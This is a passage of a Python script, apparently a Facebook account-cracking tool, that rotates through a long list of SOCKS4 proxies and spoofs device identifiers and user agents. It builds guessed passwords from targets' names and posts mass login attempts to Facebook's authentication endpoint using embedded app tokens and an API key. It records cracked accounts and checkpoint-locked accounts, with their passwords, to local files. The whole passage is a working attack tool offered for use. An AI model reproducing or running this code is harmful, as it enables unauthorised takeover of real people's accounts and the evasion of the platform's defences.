'117.74.65.29:10000', '80.92.227.185:5678', '147.139.164.26:8080', '187.19.150.221:80', '103.114.96.93:1080', '192.111.139.163:19404', '190.211.161.212:32410', '154.94.0.133:5678', '72.217.216.239:4145', '23.88.121.205:16586', '175.139.179.65:41527', '122.248.38.4:4153', '134.119.189.9:14339', '197.248.28.17:10801', '65.20.222.175:35010', '192.252.220.89:4145', '72.210.252.134:46164', '46.105.105.223:19963', '192.111.137.35:4145', '159.203.63.113:50720', '45.128.135.253:1080', '200.27.110.30:57702', '142.54.229.249:4145', '27.70.165.109:20173', '74.119.144.60:4145', '103.120.38.238:5678', '184.181.217.220:4145', '103.37.82.134:39873', '31.172.133.253:4153', '154.79.248.156:5678', '8.209.243.173:8888', '190.89.89.157:4153', '89.28.32.203:57391', '51.222.108.216:25018', '190.182.88.226:52339', '101.51.121.141:4153', '54.39.46.139:44918', '45.91.93.166:17657', '103.127.63.57:5678', '46.98.192.233:5678', '41.223.65.158:4153', '202.40.177.94:5678', '206.42.38.85:1080', '162.212.174.239:80', '138.197.66.68:42588', '45.60.197.203:8907', '95.31.5.29:51528', '36.67.63.239:38071', '138.68.109.12:47831', '131.196.180.1:4153', '195.69.135.19:5678', '68.1.210.163:4145', '95.140.117.10:1080', '109.226.36.78:1080', '217.23.13.32:35479', '179.253.8.244:7777', '14.241.241.185:4145', '162.253.68.97:4145', '45.60.197.203:1187', '184.178.172.3:4145', '5.178.217.227:31019', '103.168.123.92:5678', '39.104.89.111:999', '115.85.84.163:5678', '187.9.76.154:4153', '39.104.89.111:8084', '41.207.251.206:8899', '93.190.143.82:41515', '36.67.14.5:5678', '95.104.160.140:7788', '181.174.85.78:5678', '102.39.113.232:5678', '192.111.130.5:17002', '186.194.234.18:4153', '202.179.184.34:5430', '170.84.83.172:5678', '130.193.123.34:5678', '209.126.127.97:61122', '112.78.138.163:5678', '192.252.211.197:14921', '72.195.114.169:4145', '103.231.176.58:5678', '91.150.77.57:56921', '72.210.221.223:4145', '8.219.167.110:8009', '72.221.171.130:4145', '164.52.42.6:4145', '108.175.23.241:13135', '46.160.90.81:5678', '198.11.175.192:8989', '70.166.167.55:57745', '42.49.148.167:3333', '192.111.138.29:4145', '203.23.49.150:5678', '8.219.167.110:5678', '179.107.52.101:4153', '8.219.167.110:9000', '72.221.164.34:60671', '174.77.111.198:49547', '72.221.171.135:4145', '5.189.129.186:56940', '181.48.70.30:4153', '45.128.133.169:1080', '188.167.178.90:4145', '113.176.195.145:4153', '117.74.65.29:9595', '154.72.78.146:5678', '109.111.242.142:1080', '54.82.101.127:8088', '98.162.25.4:31654', '116.233.95.105:4145', '46.105.105.223:8028', '190.2.136.45:47521', '117.74.65.29:143', '43.248.27.11:54730', '98.162.96.53:10663', '117.74.65.29:4118', '185.164.57.111:7614', '117.74.65.29:2087', '184.178.172.14:4145', '155.254.9.2:36510', '182.16.171.42:51459', '117.74.65.29:5005', '109.166.207.162:3629', '188.64.113.104:1080', '188.75.255.119:35010', '222.165.223.140:41541', '200.116.198.140:37092', '192.252.216.81:4145', '213.6.77.198:5678', '170.246.85.108:37163', '183.88.247.52:4153', '187.19.127.246:8011', '200.41.60.33:4153', '141.94.254.138:49207', '190.12.95.170:37209', '181.115.75.102:5678', '72.206.181.123:4145', '191.36.191.53:5678', '36.64.16.154:35010', '184.105.133.1:48324', '117.74.65.29:646', '104.236.114.255:1611', '81.16.9.222:3629', '188.92.110.174:1080', '46.8.106.140:5500', '92.42.8.20:4145', '200.105.192.6:5678', '95.31.42.199:3629', '186.97.144.98:5678', '94.180.217.100:4145', '27.147.155.70:52596', '165.227.228.102:80', '108.41.35.10:22419', '181.129.74.58:30431', '187.67.26.179:4145', '117.74.65.29:3002', '51.79.248.208:54578', '187.32.20.249:5678', '200.159.146.184:4153', '117.74.65.215:9300', '103.247.22.52:12', '184.181.217.201:4145', '117.74.65.215:6789', '170.80.91.11:4145', '46.188.2.42:5678', '117.74.65.29:9093', '187.103.0.26:5678', '117.74.65.215:33427', '185.89.65.165:33744', '192.252.214.20:15864', '213.74.223.69:4153', '142.54.232.6:4145', '132.148.75.242:47171', '117.74.65.215:10091', '109.238.208.130:4153', '184.170.248.5:4145', '72.210.252.137:4145', '116.118.98.10:5678', '117.74.65.215:3000', '213.186.202.149:5678', '221.4.161.201:51080', '196.29.231.1:4145', '170.246.196.42:4153', '41.169.78.142:57775', '3.39.244.149:33080', '68.71.249.153:48606', '202.40.186.66:1088', '123.56.129.203:8089', '51.255.80.151:42304', '142.229.215.114:3128', '208.102.51.6:58208', '182.253.93.4:4145', '62.112.11.204:12692', '202.124.224.19:80', '46.227.37.21:1088', '134.209.154.177:11639', '159.192.121.240:4145', '138.219.201.242:5678', '174.75.211.222:4145', '140.210.196.193:20000', '117.74.65.215:1604', '79.143.225.152:31270', '103.106.119.146:12391', '177.131.29.209:4153', '109.224.12.170:52015', '98.162.96.41:4145', '117.74.65.215:11443', '81.174.11.159:43516', '200.146.229.129:8291', '177.185.221.57:21776', '14.160.23.139:4145', '94.247.241.70:51006', '117.74.65.29:8110', '213.165.185.211:4153', '138.68.116.249:8017', '107.181.168.145:4145', '177.66.59.130:4153', '98.181.137.80:4145', '213.222.34.200:4145', '72.221.232.155:4145', '204.3.205.243:80', '45.157.126.165:6121', '103.28.23.229:4145', '180.250.190.150:1080', '103.127.204.112:12132', '213.226.11.149:59086', '92.51.78.66:4153', '186.94.29.52:8080', '181.129.62.2:47377', '24.249.199.4:4145', '203.76.112.68:5678', '94.181.33.149:40840', '37.131.165.19:59341', '185.18.72.249:4153', '47.243.124.21:81', '172.106.13.203:56950', '181.143.61.123:4153', '67.201.33.10:25283', '27.118.21.13:5678', '213.74.223.76:4153', '103.139.246.166:5678', '62.122.201.246:50129', '89.38.96.50:48439', '115.127.87.62:1088', '115.127.75.154:1088', '103.93.100.78:32000', '103.48.183.113:4145', '103.138.22.165:32000', '190.119.167.154:5678', '104.200.135.46:4145', '103.91.95.2:32767', '119.46.2.250:4145', '103.134.113.247:32767', '114.103.88.116:8089', '110.44.171.10:57775', '95.170.202.197:58744', '46.172.75.51:5678', '41.58.169.214:5678', '190.186.216.196:5678', '103.235.199.100:25566', '58.143.65.69:22569', '125.126.213.4:38801', '197.234.58.102:57775', '45.117.228.81:4145', '186.145.192.251:5678', '109.94.178.238:3629', '103.250.153.202:41889', '46.105.105.223:45443', '138.122.74.55:57775', '200.60.71.12:46934', '103.167.172.104:57775', '183.111.165.166:14', '159.65.9.135:10277', '146.196.121.29:57775', '47.109.46.223:8090', '117.74.65.29:8012', '142.54.235.9:4145', '107.152.98.5:4145', '103.79.165.164:57775', '193.106.192.50:36387', '154.0.155.205:8080', '202.154.18.115:1080', '177.234.244.170:32213', '72.49.49.11:31034', '45.174.240.94:999', '103.168.233.91:25566', '103.149.104.161:4153', '170.254.148.110:8080', '159.138.255.141:9981', '79.122.244.99:3128', '49.70.89.82:9999', '95.158.174.111:1080', '103.18.232.47:80', '202.57.37.197:35846', '43.229.73.239:41862', '41.190.152.130:4673', '79.173.75.182:3629', '41.57.34.112:1080', '110.78.149.70:4145', '31.131.135.247:4153', '5.133.96.148:4153', '103.152.104.228:1080', '80.250.18.225:25566', '190.114.143.226:8080', '117.198.221.34:4153', '213.145.134.174:3629', '177.38.245.106:55713', '201.184.239.75:5678', '103.230.62.146:12391', '117.74.125.19:1313', '194.85.135.243:4145', '80.254.185.73:1080', '93.104.63.65:80', '165.0.15.182:5678', '91.193.125.123:3629', '117.74.120.61:1313', '177.107.217.112:4145', '24.172.34.114:60133', '41.190.232.36:36926', '117.220.162.33:5621', '95.81.94.254:3128', '197.211.24.206:5678', '103.176.96.116:5678', '91.121.163.199:40148', '94.154.21.65:1080', '102.89.12.203:7599', '119.18.146.139:4153', '209.94.84.65:1080', '117.74.120.121:1133', '47.100.90.127:10443', '103.207.170.131:5678', '180.210.222.233:1080']
            proxy = random.choice(proxy)
            pw = pw.replace("first",(fist.lower()))
            pw = pw.replace("last",(last.lower()))
            pw = pw.replace("fullname",(name.lower()))
            pw = pw.replace("First",fist)
            pw = pw.replace("Last",last)
            pw = pw.replace("Fullname",name)
            useragent = str(ua_api())
            proxs = {'http': 'socks4://'+proxy}
            adid = uuid.uuid4()
            device_id = uuid.uuid4()
            family_device_id = uuid.uuid4()
            sim = str(random.randint(11111, 99999))
            xfb_device = str(random.randint(1111, 9999))
            apk = ['438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', '350685531728|62f8ce9f74b12f84c123cc23437a4a32', '6628568379|c1e620fa708a1d5696fb991c1bde5662', '1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae', '1348564698517390|007c0a9101b9e1c8ffab727666805038']
            app = random.choice(apk)
            dataX = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': family_device_id,
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US"',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'access_token': app }
            headersX = {
                'User-Agent': useragent,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': sim,
                'X-FB-SIM-HNI': sim,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'Zong',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '882a8490361da98702bf97a021ddc14d'}
            hed = {'x-fb-connection-bandwidth':str(random.randint(20000000.0, 30000000.0)), 'x-fb-net-hni':str(random.randint(20000, 40000)), 'x-fb-sim-hni':str(random.randint(20000, 40000)), 'x-fb-connection-quality':'EXCELLENT', 'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA', 'user-agent':useragent, 'content-type':'application/x-www-form-urlencoded', 'x-fb-http-engine':'Liger'}
            responce = requests.post('https://graph.facebook.com/auth/login',data=dataX,headers=headersX,allow_redirects=False,proxies=proxs).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                #uid = responce_json['uid']
                if uid not in oks:
                    print(f'\r{green}[MARIXB-OK] {uid} | {pw} {white}')
                    open('/sdcard/MARIXB-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r{rad}[MARIXB-CP] {uid}     | {pw} {white}')
                    open('/sdcard/MARIXB-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uidX)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:print(e)
if __name__=="__main__":
     infinty()
     #bapif("100034118766868|bilal haider id",["4292416"],"2222")
